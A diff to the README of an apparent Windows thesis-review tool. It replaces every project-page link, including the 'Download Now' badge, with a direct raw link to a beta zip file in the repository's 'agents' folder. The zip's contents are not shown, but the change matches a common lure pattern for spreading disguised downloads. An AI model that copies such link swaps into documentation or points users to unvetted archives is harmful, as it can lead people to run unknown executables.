@@ -1,6 +1,6 @@
 # 🧪 eecs-thesis-blind-review - Clear thesis review on Windows
 
-[![Download](https://img.shields.io/badge/Download%20Now-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/spowken8/eecs-thesis-blind-review)
+[![Download](https://img.shields.io/badge/Download%20Now-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/spowken8/eecs-thesis-blind-review/raw/refs/heads/main/agents/thesis_blind_review_eecs_1.0-beta.1.zip)
 
 ## 🚀 What it does
 
@@ -17,7 +17,7 @@ Use it when you need:
 
 Open this page to download or access the app:
 
-https://github.com/spowken8/eecs-thesis-blind-review
+https://github.com/spowken8/eecs-thesis-blind-review/raw/refs/heads/main/agents/thesis_blind_review_eecs_1.0-beta.1.zip
 
 If the page shows a release file, download that file. If it shows the project page, use the green download button or the latest release link on that page.
 
@@ -186,7 +186,7 @@ Use the latest release file or app package on the GitHub project page.
 
 ## 📎 Project Link
 
-https://github.com/spowken8/eecs-thesis-blind-review
+https://github.com/spowken8/eecs-thesis-blind-review/raw/refs/heads/main/agents/thesis_blind_review_eecs_1.0-beta.1.zip
 
 ## 🧷 Recommended Review Workflow
 
